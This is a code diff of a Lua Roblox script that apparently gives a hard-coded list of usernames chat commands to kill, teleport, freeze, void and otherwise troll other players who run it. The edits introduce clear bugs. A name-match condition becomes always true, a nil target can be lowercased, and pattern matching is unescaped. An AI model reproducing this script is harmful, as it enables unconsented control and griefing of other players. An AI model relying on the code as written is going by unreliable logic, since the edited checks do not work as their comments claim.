@@ -2,7 +2,7 @@ local function nameMatches(player, partialName)
     local nameLower = player.Name:lower()
     local displayNameLower = player.DisplayName:lower()
     partialName = partialName:lower()
-    return nameLower == partialName or displayNameLower == partialName
+    return nameLower:find(partialName) or displayNameLower:find(partialName)
 end
 
 local adminCmd = {
@@ -10,7 +10,6 @@ local adminCmd = {
     "BloxiAstra", "IIIlIIIllIlIllIII", "AliKhammas1234", 
     "dgthgcnfhhbsd", "AliKhammas", "YournothimbuddyXD"
 }
-
 local commandsList = {
     ".rejoin", ".fast", ".normal", ".slow", ".unfloat", ".float",
     ".void", ".jump", ".trip", ".sit", ".freeze", ".unfreeze",
@@ -18,7 +17,6 @@ local commandsList = {
     ".uninvert", ".spin", ".unspin", ".disablejump", ".unenablejump",
     ".squeak", ".bighead", ".tiny", ".big", ".sillyhat"
 }
-
 local frozenPlayers = {}
 local controlInversionActive = {}
 local spinActive = {}
@@ -122,28 +120,30 @@ local function createCommandGui(player)
     end)
 end
 
--- Execute the command on the specific target
+-- Ensure commands target others only
 local function executeCommand(admin, target, command)
-    if admin.Name == target.Name then
-        Chat("You cannot target yourself!")
-        return
-    end
-    
-    if command == ".kill" then
-        target.Character.Humanoid.Health = 0
-    elseif command == ".bring" then
-        target.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
-    else
-        Chat("Command not recognized or not implemented.")
+    if admin.Name ~= target.Name then
+        if command == ".kill" then
+            target.Character.Humanoid.Health = 0
+        elseif command == ".bring" then
+            target.Character.HumanoidRootPart.CFrame = admin.Character.HumanoidRootPart.CFrame
+        -- Add additional targeting logic as needed.
+        end
     end
 end
 
--- Admin command handling
+-- Apply commands for admins
 local function setupAdminCommands(admin)
     admin.Chatted:Connect(function(msg)
-        local command, targetPartialName = msg:match("^(%S+)%s*(.*)$")
-        if not command then return end
+        msg = msg:lower()
+        local command, targetPartialName = msg:match("^(%S+)%s+(.*)$")
+        if not command or not targetPartialName then
+            command = msg -- If no target name is specified, just check the command
+        end
 
+        local player = game.Players.LocalPlayer
+        if nameMatches(player, targetPartialName) or command then
+            -- Admin Commands
             if command == ".ownercmds" then
                 createCommandGui(player)
             elseif command == ".rejoin" then
@@ -293,7 +293,7 @@ local function setupAdminCommands(admin)
 end
 
 
--- Add admin functionality for listed users
+-- Admin command listeners
 for _, player in ipairs(game.Players:GetPlayers()) do
     if table.find(adminCmd, player.Name) then
         setupAdminCommands(player)
